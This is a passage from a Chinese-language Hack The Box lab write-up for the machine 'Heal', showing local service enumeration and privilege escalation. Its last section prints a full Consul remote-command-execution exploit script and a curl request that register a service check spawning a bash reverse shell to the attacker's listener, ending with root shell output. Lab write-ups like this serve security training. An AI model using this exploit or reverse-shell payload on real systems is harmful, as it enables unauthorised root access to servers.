0240,"ReadReplica":false,"ReconnectTimeoutLAN":"0s","ReconnectTimeoutWAN":"0s","RejoinAfterLeave":false,"Reporting":{"License":{"Enabled":false}},"RequestLimitsMode":0,"RequestLimitsReadRate":1.7976931348623157e+308,"RequestLimitsWriteRate":1.7976931348623157e+308,"RetryJoinIntervalLAN":"30s","RetryJoinIntervalWAN":"30s","RetryJoinLAN":[],"RetryJoinMaxAttemptsLAN":0,"RetryJoinMaxAttemptsWAN":0,"RetryJoinWAN":[],"Revision":"048f1936","SegmentLimit":64,"SegmentName":"","SegmentNameLimit":64,"Segments":[],"SerfAdvertiseAddrLAN":"tcp://127.0.0.1:8301","SerfAdvertiseAddrWAN":"tcp://127.0.0.1:8302","SerfAllowedCIDRsLAN":[],"SerfAllowedCIDRsWAN":[],"SerfBindAddrLAN":"tcp://127.0.0.1:8301","SerfBindAddrWAN":"tcp://127.0.0.1:8302","SerfPortLAN":8301,"SerfPortWAN":8302,"ServerMode":true,"ServerName":"","ServerPort":8300,"ServerRejoinAgeMax":"168h0m0s","Services":[],"SessionTTLMin":"0s","SkipLeaveOnInt":true,"StaticRuntimeConfig":{"EncryptVerifyIncoming":true,"EncryptVerifyOutgoing":true},"SyncCoordinateIntervalMin":"15s","SyncCoordinateRateTarget":64,"TLS":{"AutoTLS":false,"Domain":"consul.","EnableAgentTLSForChecks":false,"GRPC":{"CAFile":"","CAPath":"","CertFile":"","CipherSuites":[],"KeyFile":"hidden","TLSMinVersion":"TLSv1_2","UseAutoCert":false,"VerifyIncoming":false,"VerifyOutgoing":false,"VerifyServerHostname":false},"HTTPS":{"CAFile":"","CAPath":"","CertFile":"","CipherSuites":[],"KeyFile":"hidden","TLSMinVersion":"TLSv1_2","UseAutoCert":false,"VerifyIncoming":false,"VerifyOutgoing":false,"VerifyServerHostname":false},"InternalRPC":{"CAFile":"","CAPath":"","CertFile":"","CipherSuites":[],"KeyFile":"hidden","TLSMinVersion":"TLSv1_2","UseAutoCert":false,"VerifyIncoming":false,"VerifyOutgoing":false,"VerifyServerHostname":false},"NodeName":"consul-01","ServerMode":true,"ServerName":""},"TaggedAddresses":{"lan":"127.0.0.1","lan_ipv4":"127.0.0.1","wan":"127.0.0.1","wan_ipv4":"127.0.0.1"},"Telemetry":{"AllowedPrefixes":[],"BlockedPrefixes":["consul.rpc.server.call"],"CirconusAPIApp":"","CirconusAPIToken":"hidden","CirconusAPIURL":"","CirconusBrokerID":"","CirconusBrokerSelectTag":"","CirconusCheckDisplayName":"","CirconusCheckForceMetricActivation":"","CirconusCheckID":"","CirconusCheckInstanceID":"","CirconusCheckSearchTag":"","CirconusCheckTags":"","CirconusSubmissionInterval":"","CirconusSubmissionURL":"","Disable":false,"DisableHostname":false,"DisablePerTenancyUsageMetrics":false,"DogstatsdAddr":"","DogstatsdTags":[],"EnableHostMetrics":false,"FilterDefault":true,"MetricsPrefix":"consul","PrometheusOpts":{"CounterDefinitions":[],"Expiration":"0s","GaugeDefinitions":[],"Name":"consul","Registerer":null,"SummaryDefinitions":[]},"RetryFailedConfiguration":true,"StatsdAddr":"","StatsiteAddr":""},"TranslateWANAddrs":false,"TxnMaxReqLen":524288,"UIConfig":{"ContentPath":"/ui/","DashboardURLTemplates":{},"Dir":"","Enabled":true,"HCPEnabled":false,"MetricsProvider":"","MetricsProviderFiles":[],"MetricsProviderOptionsJSON":"","MetricsProxy":{"AddHeaders":[],"BaseURL":"","PathAllowlist":[]}},"UnixSocketGroup":"","UnixSocketMode":"","UnixSocketUser":"","UseStreamingBackend":true,"Version":"1.19.2","VersionMetadata":"","VersionPrerelease":"","Watches":[],"XDSUpdateRateLimit":250},"Coord":{"Vec":[0,0,0,0,0,0,0,0],"Error":1.5,"Adjustment":0,"Height":0.00001},"Member":{"Name":"consul-01","Addr":"127.0.0.1","Port":8301,"Tags":{"acls":"1","bootstrap":"1","build":"1.19.2:048f1936","dc":"server1","ft_fs":"1","ft_si":"1","grpc_tls_port":"8503","id":"d22af051-af4e-badd-2266-a9a06ec051ed","port":"8300","raft_vsn":"3","role":"consul","segment":"","vsn":"2","vsn_max":"3","vsn_min":"2","wan_join_port":"8302"},"Status":1,"ProtocolMin":1,"ProtocolMax":5,"ProtocolCur":2,"DelegateMin":2,"DelegateMax":5,"DelegateCur":4},"Stats":{"agent":{"check_monitors":"1","check_ttls":"0","checks":"4","services":"4"},"build":{"prerelease":"","revision":"048f1936","version":"1.19.2","version_metadata":""},"consul":{"acl":"enabled","bootstrap":"true","known_datacenters":"1","leader":"true","leader_addr":"127.0.0.1:8300","server":"true"},"raft":{"applied_index":"4185","commit_index":"4185","fsm_pending":"0","last_contact":"0","last_log_index":"4185","last_log_term":"26","last_snapshot_index":"0","last_snapshot_term":"0","latest_configuration":"[{Suffrage:Voter ID:d22af051-af4e-badd-2266-a9a06ec051ed Address:127.0.0.1:8300}]","latest_configuration_index":"0","num_peers":"0","protocol_version":"3","protocol_version_max":"3","protocol_version_min":"0","snapshot_version_max":"1","snapshot_version_min":"0","state":"Leader","term":"26"},"runtime":{"arch":"amd64","cpu_count":"2","goroutines":"199","max_procs":"2","os":"linux","version":"go1.22.5"},"serf_lan":{"coordinate_resets":"0","encrypted":"true","event_queue":"1","event_time":"26","failed":"0","health_score":"0","intent_queue":"0","left":"0","member_time":"1","members":"1","query_queue":"0","query_time":"1"},"serf_wan":{"coordinate_resets":"0","encrypted":"true","event_queue":"0","event_time":"1","failed":"0","health_score":"0","intent_queue":"0","left":"0","member_time":"1","members":"1","query_queue":"0","query_time":"1"}},"Meta":{"consul-network-segment":"","consul-version":"1.19.2"},"xDS":{"SupportedProxies":{"envoy":["1.29.7","1.28.5","1.27.7","1.26.8"]},"Port":8503,"Ports":{"Plaintext":-1,"TLS":8503}}}
```
> HashiCorp Consul 1.19.2

2. Node.js / Grafana
```
ron@heal:~$ curl http://127.0.0.1:3000
<!DOCTYPE html>
<html lang="en">
  <head>
  
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    
    <!--
      manifest.json provides metadata used when your web app is installed on a
      user's mobile device or desktop. See https://developers.google.com/web/fundamentals/web-app-manifest/
    -->
    <link rel="manifest" href="/manifest.json" />
    <!--
      Notice the use of  in the tags above.
      It will be replaced with the URL of the `public` folder during the build.
      Only files inside the `public` folder can be referenced from the HTML.

      Unlike "/favicon.ico" or "favicon.ico", "/favicon.ico" will
      work correctly both with client-side routing and a non-root public URL.
      Learn how to configure a non-root public URL by running `npm run build`.
    -->
    <title>Heal</title>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root"></div>
    <!--
      This HTML file is a template.
      If you open it directly in the browser, you will see an empty page.

      You can add webfonts, meta tags, or analytics to this file.
      The build step will place the bundled scripts into the <body> tag.

      To begin the development, run `npm start` or `yarn start`.
      To create a production bundle, use `npm run build` or `yarn build`.
    -->
  <script src="/static/js/bundle.js"></script><script src="/static/js/0.chunk.js"></script><script src="/static/js/main.chunk.js"></script></body>
</html>
```
> 沒有可利用的點
3. PostgreSQL
```
ron@heal:~$ cat /etc/postgresql/14/main/pg_hba.conf
cat: /etc/postgresql/14/main/pg_hba.conf: Permission denied
ron@heal:~$ cat /etc/postgresql/14/main/pg_hba.conf
cat: /etc/postgresql/14/main/pg_hba.conf: Permission denied
ron@heal:~$ psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql: error: connection to server at "127.0.0.1", port 5432 failed: fe_sendauth: no password supplied
ron@heal:~$ grep -R "password" /etc/postgresql*
/etc/postgresql/14/main/postgresql.conf:#password_encryption = scram-sha-256    # scram-sha-256 or md5
grep: /etc/postgresql/14/main/pg_ident.conf: Permission denied
grep: /etc/postgresql/14/main/pg_hba.conf: Permission denied
```
> 權限不足，無法利用

🎯 總結：嘗試針對 HashiCorp Consul 1.19.2 研究\
![image](https://hackmd.io/_uploads/Sk6wa0Lyle.png)

### 13. Hashicorp Consul v1.0
```
┌──(chw㉿CHW)-[~]
└─$ searchsploit -x 51117
...

┌──(chw㉿CHW)-[~]
└─$ searchsploit -m 51117

┌──(chw㉿CHW)-[~]
└─$ cat 51117.txt    
# Exploit Title: Hashicorp Consul v1.0 - Remote Command Execution (RCE)
# Date: 26/10/2022
# Exploit Author: GatoGamer1155, 0bfxgh0st
# Vendor Homepage: https://www.consul.io/
# Description: Exploit for gain reverse shell on Remote Command Execution via API
# References: https://www.consul.io/api/agent/service.html
# Tested on: Ubuntu Server
# Software Link: https://github.com/hashicorp/consul

import requests, sys

if len(sys.argv) < 6:
    print(f"\n[\033[1;31m-\033[1;37m] Usage: python3 {sys.argv[0]} <rhost> <rport> <lhost> <lport> <acl_token>\n")
    exit(1)

target = f"http://{sys.argv[1]}:{sys.argv[2]}/v1/agent/service/register"
headers = {"X-Consul-Token": f"{sys.argv[5]}"}
json = {"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}

try:
    requests.put(target, headers=headers, json=json)
    print("\n[\033[1;32m+\033[1;37m] Request sent successfully, check your listener\n")
except:
    print("\n[\033[1;31m-\033[1;37m] Something went wrong, check the connection and try again\n")                      
```
開啟監聽 port
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
```
(SSH)
```
ron@heal:~$ curl -X PUT -d '{"Address": "127.0.0.1", "check": {"Args": ["/bin/bash", "-c", "bash -i >& /dev/tcp/{Kali IP}/8888 0>&1"], "interval": "10s", "Timeout": "864000s"}, "ID": "gato", "Name": "gato", "Port": 80}' http://127.0.0.1:8500/v1/agent/service/register
```
(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.10.14.76] from (UNKNOWN) [10.10.11.46] 49226
bash: cannot set terminal process group (89994): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```


### ✅ Get Root FLAG
![image](https://hackmd.io/_uploads/BydoCAIJxg.png)


###### tags: `HTB` `Web` `CTF` `Ruby on Rails App` `Sqlite3`
